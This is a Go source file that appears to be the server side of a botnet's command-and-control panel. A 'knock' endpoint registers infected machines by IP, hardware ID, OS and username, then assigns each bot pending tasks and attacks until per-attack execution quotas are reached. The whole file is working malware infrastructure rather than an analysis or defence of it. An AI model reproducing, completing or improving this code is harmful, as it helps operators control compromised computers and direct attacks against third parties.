package bot

import (
	"net/http"
	"time"

	"github.com/gin-gonic/gin"
	cTask "wyvern.pw/controllers/task"
	"wyvern.pw/data"
)

func ParseKnock(c *gin.Context) {
	var bot Bot
	err := c.BindJSON(&bot)
	if err != nil {
		c.JSON(http.StatusInternalServerError, Response{
			Code:    http.StatusInternalServerError,
			Message: err.Error(),
			Tasks:   nil,
			Attacks: nil,
		})
		c.Abort()
		return
	}

	exist, err := isBotExist(bot)
	if err != nil {
		c.JSON(http.StatusInternalServerError, Response{
			Code:    http.StatusInternalServerError,
			Message: err.Error(),
			Tasks:   nil,
			Attacks: nil,
		})
		c.Abort()
		return
	}
	if !exist {
		err = registerBot(bot)
		if err != nil {
			c.JSON(http.StatusInternalServerError, Response{
				Code:    http.StatusInternalServerError,
				Message: err.Error(),
				Tasks:   nil,
				Attacks: nil,
			})
			c.Abort()
			return
		}
	} else {
		updateBot(bot)
	}

	tasks, err := getTasksToDo(bot)
	if err != nil {
		c.JSON(http.StatusInternalServerError, Response{
			Code:    http.StatusInternalServerError,
			Message: err.Error(),
			Tasks:   nil,
			Attacks: nil,
		})
		c.Abort()
		return
	}
	attacks, err := getAttacksToDo(bot)
	if err != nil {
		c.JSON(http.StatusInternalServerError, Response{
			Code:    http.StatusInternalServerError,
			Message: err.Error(),
			Tasks:   nil,
			Attacks: nil,
		})
		c.Abort()
		return
	}

	c.JSON(http.StatusOK, Response{
		Code:    http.StatusOK,
		Message: "",
		Tasks:   tasks,
		Attacks: attacks,
	})
	c.Abort()
	return
}

func isBotExist(bot Bot) (bool, error) {
	db, err := data.GetConnection()
	if err != nil {
		return false, err
	}

	var exist int
	err = db.QueryRow("SELECT EXISTS(SELECT * FROM bots WHERE hwid=$1)",
		bot.HWID).Scan(&exist)
	if err != nil {
		return false, err
	}

	if exist == 1 {
		return true, nil
	} else {
		return false, nil
	}
}

func registerBot(bot Bot) error {
	db, err := data.GetConnection()
	if err != nil {
		return err
	}

	_, err = db.Exec("INSERT INTO bots(ip, hwid, cpu, ram, os, username, last_response) VALUES($1, $2, $3, $4, $5, $6, $7)",
		bot.IP, bot.HWID, bot.CPU, bot.RAM, bot.OS, bot.Username, time.Now().Format("2006-01-02 15:04:05"))
	return err
}

func updateBot(bot Bot) error {
	db, err := data.GetConnection()
	if err != nil {
		return err
	}

	_, err = db.Exec("UPDATE bots SET last_response=$1 WHERE hwid=$2",
		time.Now().Format("2006-01-02 15:04:05"), bot.HWID)
	return err
}

func checkBotDidAttack(bot Bot, attackID int) (bool, error) {
	db, err := data.GetConnection()
	if err != nil {
		return false, err
	}

	var did int
	err = db.QueryRow("SELECT EXISTS(SELECT * FROM attack_completed WHERE id=$1 AND hwid=$2)",
		attackID, bot.HWID).Scan(&did)
	if err != nil {
		return false, err
	}

	if did == 1 {
		return true, nil
	} else {
		return false, nil
	}
}

func botDidAttack(bot Bot, attackID int) error {
	db, err := data.GetConnection()
	if err != nil {
		return err
	}

	_, err = db.Exec("INSERT INTO attack_completed(id, hwid) VALUES($1, $2)",
		attackID, bot.HWID)
	_, err = db.Exec("UPDATE attack SET current_execution = current_execution + 1 WHERE id=$1",
		attackID)
	return err
}

func getAttacksToDo(bot Bot) ([]cTask.Attack, error) {
	attacks, err := cTask.GetAttacks()
	if err != nil {
		return nil, err
	}

	var result []cTask.Attack
	for _, attack := range attacks {
		if attack.CurrentExecution < attack.TargetExecution {
			did, err := checkBotDidAttack(bot, attack.ID)
			if err != nil {
				return nil, err
			}
			if !did {
				result = append(result, attack)
				err = botDidAttack(bot, attack.ID)
				if err != nil {
					return nil, err
				}
			}
		}
	}
	return result, nil
}

func checkBotDidTask(bot Bot, taskID int) (bool, error) {
	db, err := data.GetConnection()
	if err != nil {
		return false, err
	}

	var did int
	err = db.QueryRow("SELECT EXISTS(SELECT * FROM task_completed WHERE id=$1 AND hwid=$2)",
		taskID, bot.HWID).Scan(&did)
	if err != nil {
		return false, err
	}

	if did == 1 {
		return true, nil
	} else {
		return false, nil
	}
}

func botDidTask(bot Bot, taskID int) error {
	db, err := data.GetConnection()
	if err != nil {
		return err
	}

	_, err = db.Exec("INSERT INTO task_completed(id, hwid) VALUES($1, $2)",
		taskID, bot.HWID)
	_, err = db.Exec("UPDATE task SET current_execution = current_execution + 1 WHERE id=$1",
		taskID)
	return err
}

func getTasksToDo(bot Bot) ([]cTask.Task, error) {
	tasks, err := cTask.GetTasks()
	if err != nil {
		return nil, err
	}

	var result []cTask.Task
	for _, task := range tasks {
		if task.CurrentExecution < task.TargetExecution {
			did, err := checkBotDidTask(bot, task.ID)
			if err != nil {
				return nil, err
			}
			if !did {
				result = append(result, task)
				err = botDidTask(bot, task.ID)
				if err != nil {
					return nil, err
				}
			}
		}
	}
	return result, nil
}
